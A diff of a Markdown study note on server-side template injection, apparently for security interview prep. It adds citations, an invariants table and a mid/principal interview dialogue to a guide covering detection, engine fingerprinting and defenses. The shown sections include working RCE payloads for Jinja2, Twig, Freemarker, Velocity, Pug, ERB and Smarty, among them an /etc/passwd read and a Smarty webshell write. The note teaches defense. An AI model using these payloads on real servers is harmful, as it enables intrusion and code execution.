@@ -2,6 +2,8 @@
 
 > A template engine combines a fixed template with volatile data to produce output. SSTI happens when user input lands in the template string itself instead of being passed in as a data value, so the attacker's input is parsed and evaluated as template code with access to the engine's object model. Because that evaluation runs server-side, the impact is not a client-side script but native code execution in the engine's language: from a reachable object you walk the language's reflection/object graph to the runtime and reach OS command execution. Root cause is code/data confusion at the template layer, the exact analogue of SQL injection in a badly built prepared statement. This was first documented by James Kettle (PortSwigger) in the 2015 paper "Server-Side Template Injection: RCE for the Modern Web App."
 
+**Interview frequency:** Common
+
 ## How it works
 
 Template engines are designed so developers write a static template with placeholders and pass data in separately:
@@ -18,12 +20,30 @@ The vulnerability appears when the input is concatenated into the template that 
 $output = $twig->render("Dear " . $_GET['name']);
 ```
 
-Now `?name={{7*7}}` is not displayed literally; the engine parses `{{7*7}}` as an expression and evaluates it. The reason this is so dangerous is that a template engine is effectively a server-side interpreter: expressions can reference objects, call methods, and (in most engines) reach the host language runtime. Kettle frames a template engine as a "server-side sandbox," and SSTI is the act of escaping that sandbox.
+Now `?name={{7*7}}` is not displayed literally; the engine parses `{{7*7}}` as an expression and evaluates it. The reason this is so dangerous is that a template engine is effectively a server-side interpreter: expressions can reference objects, call methods, and (in most engines) reach the host language runtime.<sup>[[1]](#ref1)</sup> Kettle frames a template engine as a "server-side sandbox," and SSTI is the act of escaping that sandbox.<sup>[[2]](#ref2)</sup>
 
 Two contexts, each detected differently:
 
 - Plaintext context: input is placed in the free-text body, for example `render('Hello ' + username)`. Injecting `${7*7}` yields `Hello 49`. This is frequently mistaken for plain XSS, but the math evaluating server-side is the tell.
 - Code context: input is placed inside an existing template expression, for example `engine.render("Hello {{" + greeting + "}}", data)`. There is no XSS cue. Detect by first confirming there is no direct XSS (`greeting=x<tag>` gets encoded/blanked), then breaking out of the expression: `greeting=x}}<tag>`. If the `<tag>` now renders, you have escaped into template context.
+
+## Quick reference
+
+```
+# Math-probe detection: if template syntax is interpreted server-side, this evaluates
+?name={{7*7}}
+# Response shows "49" instead of the literal string "{{7*7}}" -> confirms SSTI,
+# because no browser-side XSS can compute 7*7 for you.
+```
+
+| Invariant | Where enforced | How violated | Source |
+|---|---|---|---|
+| User input is passed to the template engine only as a data value (context variable), never concatenated into the template string itself | Application render call (`render(template_file, data)` vs `render(fixed_string + input)`) | `$twig->render("Dear " . $_GET['name'])` splices input into the template text, so `{{7*7}}` is parsed as an expression instead of displayed literally | <sup>[[1]](#ref1)</sup> |
+| A sandboxed engine's method/attribute allowlist is checked against the actual dangerous operation, not a proxy interface | Sandbox's `checkMethodAllowed`-style policy | Twig's sandbox allowlisted `Twig_TemplateInterface`, so `_self.displayBlock(...)` became a gadget to invoke arbitrary methods on any reachable object, fixed only in Twig 1.20.0 | <sup>[[2]](#ref2)</sup> |
+| Dunder/reflection attributes (`__class__`, `__mro__`, `__globals__`, `.constructor`) are unreachable from a sandboxed template context | `SandboxedEnvironment` attribute filtering (Jinja2), sandbox's exposed-object set | Walking `''.__class__.__mro__[1].__subclasses__()` from any object reaches `subprocess.Popen`, giving RCE purely from the object graph | <sup>[[3]](#ref3)</sup> |
+| Whitelisted static classes/helpers exposed to templates cannot be abused to reach filesystem or code-execution sinks | Engine's secure-mode class whitelist (Smarty secure mode) | Smarty secure mode forgot to fence `Smarty_Internal_Write_File::writeFile` and `self::clearConfig()`, letting a template write a webshell to disk, fixed in Smarty 3.1.24 | <sup>[[2]](#ref2)</sup> |
+| Output encoding and server-side template evaluation are independent controls; encoding the result does not stop the engine from computing it | Response-encoding layer, separate from the template-rendering layer | HTML-encoding all output still lets `{{7*7}}` execute server-side before encoding ever runs | <sup>[[1]](#ref1)</sup> |
+| A render-sandbox escape is contained by process/container isolation, never treated as the sole security boundary | Locked-down rendering container (dropped capabilities, read-only filesystem, no outbound network) | Every major sandboxed engine has had bypass CVEs (Twig fixed 1.20.0, Smarty fixed 3.1.24), so a sandbox alone as the only control fails | <sup>[[2]](#ref2)</sup> |
 
 ## Attack techniques
 
@@ -46,7 +66,7 @@ An exception implies the syntax is being interpreted. Then discriminate engines 
 - `<%= 7*7 %>` evaluates to `49` in ERB (Ruby).
 - `{7*7}` evaluates to `49` in Smarty (single braces).
 
-Do not conclude from a single response, since payloads overlap across engines. Fastest confirmation of all: submit invalid syntax and read the error, which often names the engine and version outright. For example `<%=foobar%>` against ERB returns:
+Do not conclude from a single response, since payloads overlap across engines.<sup>[[3]](#ref3)</sup> Fastest confirmation of all: submit invalid syntax and read the error, which often names the engine and version outright. For example `<%=foobar%>` against ERB returns:
 
 ```
 (erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
@@ -77,7 +97,7 @@ Why it works: from any object you reach `__class__`, then `__mro__`/`__bases__` 
 
 ### 3. Twig / PHP
 
-Unsandboxed Twig, register a PHP callable as a filter and invoke it (from Kettle's research):
+Unsandboxed Twig, register a PHP callable as a filter and invoke it (from Kettle's research)<sup>[[2]](#ref2)</sup>:
 
 ```twig
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
@@ -89,11 +109,11 @@ Why it works: `_self.env` is the `Twig_Environment`; `registerUndefinedFilterCal
 {{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
 ```
 
-The sandbox escape was fixed in Twig 1.20.0. Simpler modern probes use `filter`/`map`/`sort` with a callback (`{{['id']|filter('system')}}`).
+The sandbox escape was fixed in Twig 1.20.0.<sup>[[2]](#ref2)</sup> Simpler modern probes use `filter`/`map`/`sort` with a callback (`{{['id']|filter('system')}}`).
 
 ### 4. Freemarker / Java
 
-Direct command execution via the `?new()` built-in and the `Execute` utility (from Kettle's research):
+Direct command execution via the `?new()` built-in and the `Execute` utility (from Kettle's research)<sup>[[2]](#ref2)</sup>:
 
 ```freemarker
 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
@@ -103,7 +123,7 @@ Why it works: `?new()` instantiates classes implementing `TemplateModel`, and Fr
 
 ### 5. Velocity / Java
 
-Chain the `ClassTool` reflection helper to `Runtime.exec` (from Kettle's research):
+Chain the `ClassTool` reflection helper to `Runtime.exec` (from Kettle's research)<sup>[[2]](#ref2)</sup>:
 
 ```velocity
 $class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
@@ -134,7 +154,7 @@ Why it works: `<%= %>` evaluates arbitrary Ruby and inlines the result; there is
 
 ### 7. Node engines (Handlebars, Pug/Jade, EJS)
 
-Walk from a global object to `child_process`. Kettle's Jade (Pug) chain:
+Walk from a global object to `child_process`. Kettle's Jade (Pug) chain<sup>[[2]](#ref2)</sup>:
 
 ```pug
 - var x = root.process
@@ -166,14 +186,14 @@ Unsandboxed Smarty runs PHP directly:
 {system('id')}
 ```
 
-Secure-mode bypass (from Kettle's research) uses static classes the whitelist forgot: `self::getStreamVariable` reads files, and `Smarty_Internal_Write_File::writeFile(...)` plus `self::clearConfig()` (which returns a Smarty instance to satisfy the type hint) writes a webshell:
+Secure-mode bypass (from Kettle's research)<sup>[[2]](#ref2)</sup> uses static classes the whitelist forgot: `self::getStreamVariable` reads files, and `Smarty_Internal_Write_File::writeFile(...)` plus `self::clearConfig()` (which returns a Smarty instance to satisfy the type hint) writes a webshell:
 
 ```smarty
 {self::getStreamVariable("file:///etc/passwd")}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
 
-Fixed in Smarty 3.1.24.
+Fixed in Smarty 3.1.24.<sup>[[2]](#ref2)</sup>
 
 ### 9. Blind SSTI
 
@@ -188,30 +208,53 @@ Config/secret disclosure (`{{config}}`, env dump) to arbitrary file read/write t
 
 ## Defense
 
-Ordered by effectiveness. The real fix is data/code separation; sandboxing is defense in depth.
+### Real fix
 
 1. Never build templates from user input. Pass user data as context/variables into a static, developer-authored template, the same separation as parameterized SQL: `render(template_file, name=user_input)`, never `render(fixed_string + user_input)`. This removes the vulnerability class.
 2. If users must supply templates (wikis, CMS, marketing/email builders, reporting), prefer a logic-less engine (Mustache) or one with minimal expressive power (Python's `string.Template`). Separating logic from presentation shrinks the dangerous surface dramatically.
-3. If you must run user templates in a full engine, use a sandboxed mode with a strict allowlist of exposed variables/filters, and treat the sandbox as a hardening layer, not a guarantee: every major engine has had sandbox-escape CVEs (Twig sandbox fixed in 1.20.0, Smarty secure mode fixed in 3.1.24). Keep engines patched.
-4. Concede that a sandbox escape may happen and contain the blast radius: run rendering in a locked-down Docker container with dropped capabilities, a read-only filesystem, no outbound network, and least privilege, so an escape does not become full RCE plus exfil. MediaWiki's approach (a stripped Lua sandbox) is a cited example that has held up.
-5. Contextual output encoding still matters for the XSS surface but does NOT stop server-side evaluation. Do not confuse the two: encoding the output does nothing about `{{7*7}}` being computed on the server.
+
+### Defense in depth
+
+1. If you must run user templates in a full engine, use a sandboxed mode with a strict allowlist of exposed variables/filters, and treat the sandbox as a hardening layer, not a guarantee: every major engine has had sandbox-escape CVEs (Twig sandbox fixed in 1.20.0, Smarty secure mode fixed in 3.1.24).<sup>[[2]](#ref2)</sup> Keep engines patched.
+2. Concede that a sandbox escape may happen and contain the blast radius: run rendering in a locked-down Docker container with dropped capabilities, a read-only filesystem, no outbound network, and least privilege, so an escape does not become full RCE plus exfil. MediaWiki's approach (a stripped Lua sandbox) is a cited example that has held up.
+3. Contextual output encoding still matters for the XSS surface but does NOT stop server-side evaluation. Do not confuse the two: encoding the output does nothing about `{{7*7}}` being computed on the server.
 
 Detection (defensive review): grep for template APIs that receive a dynamic/concatenated template string rather than a fixed template file plus data: `render_template_string`, `env.from_string`, `Template(user_input)`, `new Template(...)`, string concatenation into `render()`, plus any feature that lets users author templates (email customization, notification templates, WYSIWYG "expression" fields, report builders). User-supplied templates are the highest-risk feature.
 
-## Interview-grade nuances
+## Interviewer probes
 
-- SSTI vs XSS is the classic trap. In the plaintext context SSTI often also produces XSS, and juniors stop at "reflected XSS." The senior move is to send `{{7*7}}`/`${7*7}`: server-side evaluation (math with no browser) proves SSTI, which is usually RCE, not just XSS.
-- Code context is the easy-to-miss one: no XSS cue, looks like a hashmap lookup. Detect by confirming no direct XSS, then breaking out with `}}` (or the engine's terminator) and injecting after it.
-- "We HTML-encode the output" is a wrong answer. Encoding addresses XSS, not evaluation. The fix is not concatenating input into the template at all.
-- `{{7*'7'}}` returning `7777777` vs `49` (Jinja2 vs Twig) is the single best fingerprint to cite; and note that one probe can succeed in multiple engines, so never conclude from one response.
-- Sandboxes are not a security boundary you can trust. Kettle's paper explicitly escapes sandboxes whose entire purpose is safe user templates (Twig sandbox via `checkMethodAllowed`/`displayBlock`, Smarty secure mode via static classes). The staff-level framing: a sandbox cuts specific edges in the object graph, and bypasses find an edge it forgot to cut. Treat it as defense in depth behind a container.
-- Intentional vs accidental: SSTI arises both by developer mistake (concatenation) and by design (features that let privileged users edit templates in wikis/CMS/marketing tools). The intentional case is why sandboxed modes exist and why they keep getting broken.
-- SSTI can arrive out-of-band. Kettle notes it can appear as an LFI-to-RCE variant (template code embedded in log files, session files, `/proc/self/environ`), so the injection point is not always an obvious request parameter.
-- "Server-side" is a deliberate qualifier: client-side template injection (AngularJS, Vue, Handlebars in the browser) is an XSS-class problem. This document is about achieving code execution on the server.
-- Unsandboxed engines are trivially RCE (Smarty `{php}`, Mako `<% %>`, ERB `<%= %>`, Freemarker `?new()`), so identifying the engine is often the whole exploit; the hard work is only when a sandbox is present.
+Mid: "The response reflects your input back, and you see `<tag>` render unescaped. That's XSS, right?"
+
+Principal: Not necessarily, and confirming which one matters. Send `{{7*7}}` or `${7*7}` instead of a script tag: if the response shows `49`, that math executed server-side, which no browser-side XSS can do. Juniors stop at "reflected XSS" in the plaintext context; the senior move is proving server-side evaluation, because SSTI usually escalates to RCE, not just a script running in someone's browser.
+
+Mid: "The parameter looks like it's just filling in a value, e.g. rendering `Hello {{greeting}}`. You tried a script tag and it got encoded. Is this endpoint safe?"
+
+Principal: No, that only rules out the plaintext-context case. Code context means the input lands inside an existing template expression, so there's no XSS cue to notice, it just looks like a hashmap lookup. Confirm there's no direct XSS, then try breaking out of the expression with the engine's terminator, for example `greeting=x}}<tag>`. If the tag renders after that, you've escaped into template context and the earlier "safe" result was a false negative.
+
+Mid: "The team says they HTML-encode all user-facing output, so injection isn't a concern here."
+
+Principal: That's a wrong answer for SSTI specifically. Encoding addresses XSS, the browser-side rendering of the response; it does nothing about `{{7*7}}` being computed on the server before encoding ever happens. The only real fix is to stop concatenating user input into the template string at all and pass it as a context variable instead, the same data/code separation as a parameterized SQL query.
+
+Mid: "How do you figure out which template engine you're dealing with once you suspect SSTI?"
+
+Principal: Discriminate with math and string probes rather than trusting one response. `{{7*7}}` evaluating to `49` narrows you to `{{ }}`-style engines like Jinja2 or Twig, but `{{7*'7'}}` is the payload that actually separates them: Twig coerces to `49`, Jinja2 does Python-style string repetition and returns `7777777`. The important discipline is not concluding from a single payload, since syntax overlaps across engines; where possible, submit deliberately invalid syntax and read the error message, which often names the engine and version outright.
+
+Mid: "The app runs user-supplied templates through a sandboxed engine, like Twig's sandbox mode or Smarty's secure mode. Are we covered?"
+
+Principal: Sandboxing is defense in depth, not a guarantee. Every major engine with a sandbox has had escape CVEs: Twig's sandbox was defeated via `checkMethodAllowed`/`displayBlock` because the sandbox whitelisted an interface rather than the actual dangerous methods, and Smarty's secure mode was defeated via static classes the whitelist forgot to fence, both fixed only after the bypass was found. A sandbox cuts specific edges in the object graph; a bypass just finds an edge it forgot to cut. Treat it as a hardening layer behind real data/code separation and a locked-down container, not as the security boundary itself.
+
+Mid: "You've fuzzed every request parameter for SSTI and gotten no reflection anywhere. Can you conclude the app isn't vulnerable?"
+
+Principal: No. SSTI can arrive out-of-band: template code can end up embedded in log files, session files, or `/proc/self/environ`, and get evaluated later when something else triggers a render of that data, not on the request that supplied it. The injection point isn't always an obvious request parameter, so blind confirmation (time delays, DNS/HTTP callbacks) still needs to be tried even when nothing reflects.
+
+Mid: "We found an AngularJS expression injection in the frontend. Same bug class as SSTI?"
+
+Principal: No, different class with different impact. "Server-side" is the operative word: client-side template injection in AngularJS, Vue, or Handlebars running in the browser is XSS-class, it executes in the victim's browser session. SSTI evaluates on the server, in the server's language runtime, which is why it escalates to RCE, file read/write, and internal network access rather than a browser-scoped script.
 
 ## Sources
 
-- PortSwigger Web Security Academy, Server-side template injection: https://portswigger.net/web-security/server-side-template-injection
-- PortSwigger Web Security Academy, Exploiting SSTI: https://portswigger.net/web-security/server-side-template-injection/exploiting
-- James Kettle (PortSwigger Research), Server-Side Template Injection: RCE for the Modern Web App: https://portswigger.net/research/server-side-template-injection
+<a id="ref1"></a>[1] PortSwigger Web Security Academy, "Server-side template injection". Retrieved 2026. https://portswigger.net/web-security/server-side-template-injection
+
+<a id="ref2"></a>[2] James Kettle (PortSwigger Research), "Server-Side Template Injection: RCE for the Modern Web App". 2015. https://portswigger.net/research/server-side-template-injection
+
+<a id="ref3"></a>[3] PortSwigger Web Security Academy, "Exploiting SSTI". Retrieved 2026. https://portswigger.net/web-security/server-side-template-injection/exploiting
